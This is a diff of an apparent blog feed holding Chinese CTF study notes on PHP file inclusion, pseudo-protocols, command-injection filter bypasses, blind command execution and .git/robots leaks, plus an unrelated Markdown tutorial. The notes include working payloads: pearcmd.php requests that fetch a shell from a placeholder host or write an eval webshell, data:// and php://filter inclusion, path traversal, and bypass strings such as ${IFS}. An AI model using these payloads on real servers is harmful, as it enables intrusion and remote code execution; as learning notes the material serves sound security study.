+      <![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;</p><h3 id="一-文件名可控"><a href="#一-文件名可控" class="headerlink" title="一 文件名可控"></a>一 文件名可控</h3><p>$file&#x3D;$_GET[‘file’];</p><p>include $file.”.php”;  &#x2F;&#x2F;用php伪协议 ，可以使用data协议</p><h3 id="二-文件后缀可控"><a href="#二-文件后缀可控" class="headerlink" title="二 文件后缀可控"></a>二 文件后缀可控</h3><p>$file&#x3D;$_GET[‘file’];</p><p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;“.$file;   &#x2F;&#x2F;不能使用伪协议了，伪协议他前面有固定的格式</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag &#x2F;&#x2F; 通过目录跳转实现文件包含</p><h2 id="高级文件包含"><a href="#高级文件包含" class="headerlink" title="高级文件包含"></a>高级文件包含</h2><h3 id="一-nginx日志文件包含"><a href="#一-nginx日志文件包含" class="headerlink" title="一 nginx日志文件包含"></a>一 nginx日志文件包含</h3><p>nginx  可以认为它是http的一个服务器软件，提供了http服务 ，默认监听80端口</p><p><a href="http://localhost/123.php?a=b">http://localhost/123.php?a=b</a></p><p>123.php 后缀是否是.php .就进行一次转发，转发到本地的127.0.0.1的9000端口</p><p>9000端口，是被另一个服务端软件监听，它提供解析php文件的服务，我们把这个软件，叫做php-fpm</p><p>专门解析php后缀的文件，执行里面代码，将执行结果交给nginx,再由nginx返回给http的客户端，这个客户端就是浏览器</p><p><a href="http://localhost/123.jpg">http://localhost/123.jpg</a></p><p>123.jpg 非php后缀，那么由自己处理，nginx会找到web目录，读取123.jpg的内容，并返回给浏览器，同时告诉浏览器，我返回的<br>文件内容是一个jpg图片，你按照图片模式进行渲染，于是，浏览器页面上就能显示出一张图片出来</p><h4 id="日志包含的前提条件"><a href="#日志包含的前提条件" class="headerlink" title="日志包含的前提条件"></a>日志包含的前提条件</h4><p>1 有文件名可控的文件包含点,文件不能有后缀<br>2 有可以访问到的日志路径   默认nginx的日志路径为 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><h3 id="二-临时文件包含"><a href="#二-临时文件包含" class="headerlink" title="二 临时文件包含"></a>二 临时文件包含</h3><p>&#x2F;tmp&#x2F;php??????</p><p>文件包含，能否包含一个 &#x2F;???&#x2F;????????[@-[]]</p><p>答案是：不行 文件包含，是不支持通配符 </p><p>我们明确的，得到这个临时目录下php开头的随机文件名字全称，然后我们就可以正常包含进去</p><p>默认情况，生命周期与php脚本一致，也就是说，脚本运行过程中，存在，脚本运行结束了，这个临时文件会被自动删除</p><p>突破点：<br>1 在php脚本运行过程中，包含临时文件<br>2 在脚本运行过程中，得到完整的临时文件名称 </p><p>php配置文件中，默认，每次向浏览器发送内容时，不是一个字符一个字符发送的，它是一块内容一块内容发送的<br>4096个字符</p><p>假设我们能够访问phpinfo的结果  FILES 就会存在tmp_name临时文件名字，读取后可以成功包含<br>php文件脚本记得上传<br>跑出来算你运气好</p><p>phpinfo_lfi</p><h3 id="三-php的session文件包含，upload-progress文件包含"><a href="#三-php的session文件包含，upload-progress文件包含" class="headerlink" title="三  php的session文件包含，upload_progress文件包含"></a>三  php的session文件包含，upload_progress文件包含</h3><p>强制文件上传时，通过上传一个固定的表单PHP_SESSION_UPLOAD_PROGRESS ，可以往服务器的session文件内写入我们的指定内容</p><p>然后在脚本运行过程中<br>包含后，可以执行里面的php代码</p><h3 id="四-pear文件包含"><a href="#四-pear文件包含" class="headerlink" title="四 pear文件包含"></a>四 pear文件包含</h3><p>条件：</p><p>1 有文件包含点<br>2 开启了pear扩展<br>3 配置文件中register_argc_argv 设置为On,而默认为Off</p><p>PEAR扩展</p><p>PHP Extension and Application Repository</p><p>默认安装位置是  &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;  </p><p>利用Pear扩展进行文件包含</p><h5 id="方法一-远程文件下载"><a href="#方法一-远程文件下载" class="headerlink" title="方法一  远程文件下载"></a>方法一  远程文件下载</h5><p>?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;ctfshow+install+-R+&#x2F;var&#x2F;www&#x2F;html&#x2F;+<a href="http://your-shell.com/shell.php">http://your-shell.com/shell.php</a></p><h5 id="方法二-生成配置文件，配置项传入我们恶意的php代码的形式"><a href="#方法二-生成配置文件，配置项传入我们恶意的php代码的形式" class="headerlink" title="方法二  生成配置文件，配置项传入我们恶意的php代码的形式"></a>方法二  生成配置文件，配置项传入我们恶意的php代码的形式</h5><p>a&#x3D;b</p><p>username&#x3D;root<br>man_dir&#x3D;<?php eval($_POST[1]);?></p><p>ctfshow.php<br>GET &#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+-c+&#x2F;tmp&#x2F;ctf.php+-d+man_dir&#x3D;<?eval($_POST[1]);?>+-s+ </p><h5 id="方法三-写配置文件方式"><a href="#方法三-写配置文件方式" class="headerlink" title="方法三  写配置文件方式"></a>方法三  写配置文件方式</h5><p>GET &#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;aaaa+config-create+&#x2F;var&#x2F;www&#x2F;html&#x2F;<?=`$_POST[1]`;?>+1.php </p><h3 id="五-远程文件包含"><a href="#五-远程文件包含" class="headerlink" title="五 远程文件包含"></a>五 远程文件包含</h3><p>通过域名转数字的形式，可以不用.来构造远程文件地址</p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp</a></p><p>?file&#x3D;<a href="http://43.154.107.226/1">http://731540450/1</a></p>]]>
+    </content>
+    <id>http://example.com/2026/10/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E8%BF%9B%E9%98%B6/</id>
+    <link href="http://example.com/2026/10/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E8%BF%9B%E9%98%B6/"/>
+    <published>2026-10-18T12:13:39.000Z</published>
+    <summary>
+      <![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;</p>
+<h3]]>
+    </summary>
+    <title>php文件包含(进阶)</title>
+    <updated>2026-10-29T12:50:57.095Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    <content>
+      <![CDATA[<h3 id="文件包含的本质"><a href="#文件包含的本质" class="headerlink" title="文件包含的本质"></a>文件包含的本质</h3><p>代码复用<br>并行开发<br>模块化<br>增加移植性</p><h3 id="1-include和eval的区别"><a href="#1-include和eval的区别" class="headerlink" title="1.include和eval的区别"></a>1.include和eval的区别</h3><p>include和eval一样，都不是函数，都是语言结构，无法通过配置文件函数禁用来禁用</p><p>include 后面跟 一个路径，表示要执行的php文件的路径 读取路径中文件内容后，然后执行里面的php代码<br>而eval 后面跟 php的代码，表示要执行的php代码</p><p>php的常见文件包含函数、语言结构</p><p>include 仅仅是包含这个文件，如果文件不存在，那么也没啥大不了了，继续执行后面代码</p><p>require 必须包含好这个文件，如果没包含好，就不执行了，报错</p><p>include_once 包含一次 遇到错误继续执行<br>require_once 成功包含一次，遇到错误停止</p><p>include “flag.php”;</p><p>文件包含漏洞，是指，通过文件包含时，包含的内容我们用户可控</p><p>一些协议概念我就不介绍了，自己查去</p><h2 id="2-file协议"><a href="#2-file协议" class="headerlink" title="2.file协议"></a>2.file协议</h2><p>不写协议名字，就默认认为是file协议</p><p>相对路径和绝对路径</p><h3 id="上层目录特性"><a href="#上层目录特性" class="headerlink" title="上层目录特性"></a>上层目录特性</h3><p>1 每个目录都有上层目录<br>2 根目录的上层目录是根目录本身</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;  &#x3D;&gt; &#x2F;  目录</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;  &#x3D;&gt; &#x2F;  目录 上溯</p><p>比如说某个flag在根目录里边，但是你不知道根目录在哪里，你就可以一直上溯</p><h3 id="3-php目录整理特性"><a href="#3-php目录整理特性" class="headerlink" title="3.php目录整理特性"></a>3.php目录整理特性</h3><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;flag.php</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>就是说如果你写成第一行，那样就算文件里没有ctf这个文件，他也不会进行报错，他会转换成第二行那种形式</p><h2 id="4-三元表达式"><a href="#4-三元表达式" class="headerlink" title="4.三元表达式"></a>4.三元表达式</h2><p>A?B:C</p><p>如果A成立，返回B的结果，否则返回C的结果</p><h2 id="5-http协议"><a href="#5-http协议" class="headerlink" title="5 .http协议"></a>5 .http协议</h2><p>配合文件包含，可以读取远程的php代码并在本地执行，实现了最终RCE的效果</p><pre><code>&lt;?phpinclude &quot;https://baidu.com/robots.txt&quot;;?&gt;</code></pre><p>然后再用浏览器访问这个PHP文件，比如说这个PHP文件叫做my 2，就在本地访问这个my 2就可以了127.0.0.1&#x2F;my2.php</p><h2 id="6-ftp协议"><a href="#6-ftp协议" class="headerlink" title="6 .ftp协议"></a>6 .ftp协议</h2><p>默认21端口，进行文件传输的协议</p><h2 id="7-php协议-重要"><a href="#7-php协议-重要" class="headerlink" title="7 .php协议(重要)"></a>7 .php协议(重要)</h2><p>php:&#x2F;&#x2F;input</p><pre><code>&lt;?phpinclude &quot;php://input&quot;;?&gt;</code></pre><p>这里就相当于输入一个代码，比如说它包含了一个这个PHP input，你可以抓包直接使用PHP代码进行重发，然后它就会直接显示结果</p><p>注意这个输入，它是按照文本文档处理的，你想执行PHP代码就得按照PHP格式写</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>举一个例子</p><pre><code>/?file=php://filter/write=convert.base64-decode/resource=1.php</code></pre><p>这个就是将某个文件写入，然后进行一个b64编码，写进1.PHP文件里，然后配合的就是输入一个命令，然后进行一个b64编码，进行一个rce，一般题目有两个请求头</p><p>具体的玩法可以查看PHP中文手册，上面有很多玩法</p><h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><p>他有个固定的格式<br>data:&#x2F;&#x2F;text&#x2F;plain</p><pre><code>ctfer.com:8080/?file=data://text/plain,&lt;?php phpinfo();?&gt;</code></pre><p>比如说我可以这样进行书写，直接执行一个php代码，data协议相比于其他协议简单很多</p><p>更多玩法查阅php中文手册</p><h2 id="8-php的文件上传机制"><a href="#8-php的文件上传机制" class="headerlink" title="8.php的文件上传机制"></a>8.php的文件上传机制</h2><p>$_GET    $_POST</p><p>$_SERVER    $_COOKIE</p><p>$_SESSION    $_FILES</p><p>这里显示有问题</p><h4 id="过滤的字母数字时-可以进行模糊搜索"><a href="#过滤的字母数字时-可以进行模糊搜索" class="headerlink" title="过滤的字母数字时,可以进行模糊搜索"></a>过滤的字母数字时,可以进行模糊搜索</h4><p>如？cnd&#x3D;.&#x2F;？？？&#x2F;？？？这里使用若干个问号[@–[];</p><p>这里是进行一个数字到字母的匹配，根据问号的个数匹配字符，如果开始报错的话可以在.后加上+加号表示一个空格</p><p>当然，这里也可以使用前面写过的，进行编码处理</p>]]>
+    </content>
+    <id>http://example.com/2026/10/15/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E9%87%8D%E7%82%B9%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
+    <link href="http://example.com/2026/10/15/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E9%87%8D%E7%82%B9%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
+    <published>2026-10-15T03:50:43.000Z</published>
+    <summary>
+      <![CDATA[<h3 id="文件包含的本质"><a href="#文件包含的本质" class="headerlink" title="文件包含的本质"></a>文件包含的本质</h3><p>代码复用<br>并行开发<br>模块化<br>增加移植性</p>
+<h3 id="1-include]]>
+    </summary>
+    <title>PHP文件包含(重点伪协议</title>
+    <updated>2026-10-29T12:50:54.023Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
     <content>
       <![CDATA[<p>md这个研究了两天时间真服了，有的东西都记混了，什么协议的，这篇可能说不太明白</p><h2 id="无回显状态下命令执行"><a href="#无回显状态下命令执行" class="headerlink" title="无回显状态下命令执行"></a>无回显状态下命令执行</h2><p>通道</p><h3 id="1-dns信道"><a href="#1-dns信道" class="headerlink" title="1.dns信道"></a>1.dns信道</h3><p>使用dnslog进行解析，解析后会将数据传回</p><p>dnslog网站极其不稳定，不推荐</p><h3 id="2-http信道"><a href="#2-http信道" class="headerlink" title="2.http信道"></a>2.http信道</h3><p>也不推荐进行使用</p><h3 id="3-写入文件，二次返回"><a href="#3-写入文件，二次返回" class="headerlink" title="3.写入文件，二次返回"></a>3.写入文件，二次返回</h3><p>比如说讲咱们想要进行的命令操作写入txt，</p><p>写入后再去访问txt</p><h3 id="4反弹shell信道"><a href="#4反弹shell信道" class="headerlink" title="4反弹shell信道"></a>4反弹shell信道</h3><p>4.1使用蚁剑进行拿取shell</p><p>根据题目具体观察，看他禁用了什么，</p><p>assert可以当做eval使用</p><p>比如使用蚁剑插件如disable function再提权进行拿shell等</p><p>各种插件都可以去试一下，使用完记得清除痕迹</p><p>4.2.nc反弹，bash反弹，</p><p>要一个公网ip，可以购买一个云服务器</p><p>让目标机器主动连回你的机器，并把一个 shell 进程的标准输入、输出、错误都绑到你的连接中</p><p>反弹还弄的不是太明白，以后再拿一篇文章介绍</p><h4 id="没有一个工具能ak所有题，不要被工具所局限"><a href="#没有一个工具能ak所有题，不要被工具所局限" class="headerlink" title="没有一个工具能ak所有题，不要被工具所局限"></a>没有一个工具能ak所有题，不要被工具所局限</h4>]]>
     </content>
@@ -119,6 +131,90 @@ eval=$code;
 <h2 id="无回显状态下命令执行"><a href="#无回显状态下命令执行" class="headerlink" title="无回显状态下命令执行"></a>无回显状态下命令执]]>
     </summary>
     <title>php代码执行3(难)</title>
-    <updated>2026-10-29T12:22:08.399Z</updated>
+    <updated>2026-10-29T12:50:56.230Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="Markdown" scheme="http://example.com/tags/Markdown/"/>
+    <content>
+      <![CDATA[<h2 id="标题元素"><a href="#标题元素" class="headerlink" title="标题元素"></a>标题元素</h2><p>符号#表示标题元素</p><p>1个#表示1号标题，字体最大。</p><p>2个#表示2号标题，字体变小。</p><p>3个#表示3号标题，字体再变小。</p><p>4个#表示4号标题，字体逐渐变小。</p><p>…</p><h2 id="区块元素"><a href="#区块元素" class="headerlink" title="区块元素"></a>区块元素</h2><blockquote><p>表示区块开始<br>显示不出是＜这个</p></blockquote><h2 id="强调元素"><a href="#强调元素" class="headerlink" title="强调元素"></a>强调元素</h2><p>*和_（下划线）都可以表示强调</p><p>使用方式：<br>● 一个*或者一个下划线表示倾斜</p><p>● 两个*或者两个下划线表示加粗</p><p>● 三个*或者三个下划线表示加粗 + 倾斜</p><p><em>机你太美</em></p><p><strong>机你太美</strong></p><h2 id="列表元素"><a href="#列表元素" class="headerlink" title="列表元素"></a>列表元素</h2><p>*或＋加上空格</p><ul><li>机你太美</li></ul><h2 id="代码区块"><a href="#代码区块" class="headerlink" title="代码区块"></a>代码区块</h2><p>三个反引号表示代码区块</p><p>代码右下角可以选择语言</p><pre><code></code></pre><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><ul><li>三个*+回车</li></ul><p>● 三个下划线+回车</p><p>● 三个横杠+回车</p><hr><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>［超链接名称］(url)<br>如</p><p><a href="http://www.baidu.com/">baidu</a></p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>格式：<br>给网址起一个别名<br>[别名]: (url)</p><p>使用这个别名<br>[使用的地方] [别名]</p><p>如<br>[机]: <a href="http://www.baidu.com/">http://www.baidu.com</a></p><p><a href="%E6%9C%BA">鸡</a>你太美</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="行内式（常用）"><a href="#行内式（常用）" class="headerlink" title="行内式（常用）"></a>行内式（常用）</h3><p>格式∶！<a href="%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84">图片的名称</a></p><p>这里显示不出来</p><p>第一个是图片的名称第二个是路径</p><p>[图片的名称]，(图片的路径)逗号去掉</p><h3 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h3><p>格式：<br>第一步：起一个名字表示一张图片<br>[图片名]:图片地址<br>第二步：使用刚刚起的名字</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>在pc端右键就有快捷方式了，但是掘金好像有点区别</p>]]>
+    </content>
+    <id>http://example.com/2026/10/13/markdown%E8%AF%AD%E6%B3%95/</id>
+    <link href="http://example.com/2026/10/13/markdown%E8%AF%AD%E6%B3%95/"/>
+    <published>2026-10-13T03:19:39.000Z</published>
+    <summary>
+      <![CDATA[<h2 id="标题元素"><a href="#标题元素" class="headerlink" title="标题元素"></a>标题元素</h2><p>符号#表示标题元素</p>
+<p>1个#表示1号标题，字体最大。</p>
+<p>2个#表示2号标题，字体变小。</p>
+<p]]>
+    </summary>
+    <title>markdown语法</title>
+    <updated>2026-10-29T12:50:54.859Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    <content>
+      <![CDATA[<p><strong>eval</strong><br>表示将字符串用php代码执行</p><p>如</p><p>`&lt;?php</p><pre><code>$code = $_POST(&#39;code&#39;);eval=$code;</code></pre><p>?&gt;`</p><p>在一些场景中服务器发的是GET请求，但是你使用工具必须得换成POST请求，要进行一个转换</p><p><img src="/images/php-exec-2/01.webp"></p><p>比如说如图情况在后边加上？1&#x3D;eval($_POST);</p><p>就是把GET当作一个转接头，让GET请求执行POST命令</p><p><strong>回调函数</strong> &#x3D; 一个被当作参数传给别人的函数，由别人在合适的时机替你调用。<br>这个有很多用法，遇到不会的去看php中文手册</p><p><strong>RCE</strong></p><p>Command指操作系统的命令</p><p>system<br>passthru<br>exec<br>shell_exec<br>popen<br>pcntl_exec</p><p>执行运算符 <code>（shell_exec） // cat</code>echo ‘xxxx’ | base64 -d`</p><p>不会去看php中文手册</p>]]>
+    </content>
+    <id>http://example.com/2026/10/10/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2/</id>
+    <link href="http://example.com/2026/10/10/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2/"/>
+    <published>2026-10-10T15:19:49.000Z</published>
+    <summary>
+      <![CDATA[<p><strong>eval</strong><br>表示将字符串用php代码执行</p>
+<p>如</p>
+<p>`&lt;?php</p>
+<pre><code>$code = $_POST(&#39;code&#39;);
+eval=$code;
+</code></pre]]>
+    </summary>
+    <title>php代码执行2</title>
+    <updated>2026-10-29T12:50:55.790Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    <content>
+      <![CDATA[<p>在php中，有下面6种函数可以执行系统命令<br>· system· passthru· exec· shell_exec· popen· pcntl_exec· 执行运算符 &#96;</p><p>在windows服务器上，我们可以执行windows的系统命令或者程序名称，例如calc、bat、vbs等等<br>在linux&#x2F;unix服务器上，我们可以执行linux的系统命令，例如cat cp nc等等</p><p>今天主要学习到几种php过滤方式以及应对策略，介绍一下</p><p>1.替换过滤<br>比如说把cat，替换成空格，我们就不能执行cat操作<br>此时我们可以使用tac或者是双写cat像这样：cacatt这样过滤后就是cat</p><p>2.过滤特定字符<br>比如说他过滤了flag，我们可以使用通配符*或者？进行补齐，？只能补齐一个字符。在移动文件等场景也会使用通配符。<br>2.1还可以通过b64加密再解码输出的形式输出</p><p>3.无回显<br>输入指令无回显，使用＆＆或者｜｜进行一个短路处理，就是说把执行的命令放左边，将右边的命令进行一个短路，右边的命令无回显，左边正常运行</p><p>4.拼接过滤<br>其实也是2的一种，如果防御者把b64或者echo过滤了可以用这种<br>如a&#x3D;c;b&#x3D;at;c&#x3D;fla;d&#x3D;g.php;$a$b ${c}${d}<br>等效于cat flag.php</p><p>5.符号过滤<br>比如说把空格过滤<br>读文件时可以用&lt;&gt;<br>或者用＄{IFS}<br>或者用控制字符代替如%01，找不到控制字符时可以爆破试试<br>万不得已可以在源代码找到这个符号，然后根据源代码的位置将这个符号进行输出如<br>echo ${hajbsh:12:1}<br>输出hajb后十二个字符后第一个字符</p>]]>
+    </content>
+    <id>http://example.com/2026/10/09/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
+    <link href="http://example.com/2026/10/09/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    <published>2026-10-09T14:28:33.000Z</published>
+    <summary>
+      <![CDATA[<p>在php中，有下面6种函数可以执行系统命令<br>· system· passthru· exec· shell_exec· popen· pcntl_exec· 执行运算符 &#96;</p>
+<p>在windows服务器上，我们可以执行windows的系统命令或者程序名]]>
+    </summary>
+    <title>php代码执行</title>
+    <updated>2026-10-29T12:50:55.310Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Lao Zhen</name>
+    </author>
+    <category term="ctf学习(暂时)" scheme="http://example.com/categories/ctf%E5%AD%A6%E4%B9%A0-%E6%9A%82%E6%97%B6/"/>
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    <content>
+      <![CDATA[<p>1.git泄露</p><p>git泄露就是服务器意外泄露了.git目录</p><p>形式像这样……&#x2F;baidu.com&#x2F;.git&#x2F;注意要有.和&#x2F;</p><p>如果显示403可用githack脚本将数据下载到本地<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>2.robots泄露</p><p>这个就是一个文本，告诉爬虫者哪些可以抓取哪些不能抓，也变相告诉渗透者重要信息在哪</p><p>User-agent: *<br>Disallow: &#x2F;admin&#x2F;<br>Disallow: &#x2F;backup&#x2F;<br>Disallow: &#x2F;db&#x2F;<br>Disallow: &#x2F;api&#x2F;internal&#x2F;<br>Disallow: &#x2F;config.php</p><p>发现形式就是……&#x2F;baidu.com&#x2F;robots.txt直接进入即可</p>]]>
+    </content>
+    <id>http://example.com/2026/10/09/git%E6%B3%84%E9%9C%B2%E4%B8%8Erobots%E6%B3%84%E9%9C%B2/</id>
+    <link href="http://example.com/2026/10/09/git%E6%B3%84%E9%9C%B2%E4%B8%8Erobots%E6%B3%84%E9%9C%B2/"/>
+    <published>2026-10-09T14:27:04.000Z</published>
+    <summary>
+      <![CDATA[<p>1.git泄露</p>
+<p>git泄露就是服务器意外泄露了.git目录</p>
+<p>形式像这样……&#x2F;baidu.com&#x2F;.git&#x2F;注意要有.和&#x2F;</p>
+<p>如果显示403可用githack脚本将数据下载到本地<a href="]]>
+    </summary>
+    <title>git泄露与robots泄露</title>
+    <updated>2026-10-29T12:50:54.450Z</updated>
   </entry>
 </feed>
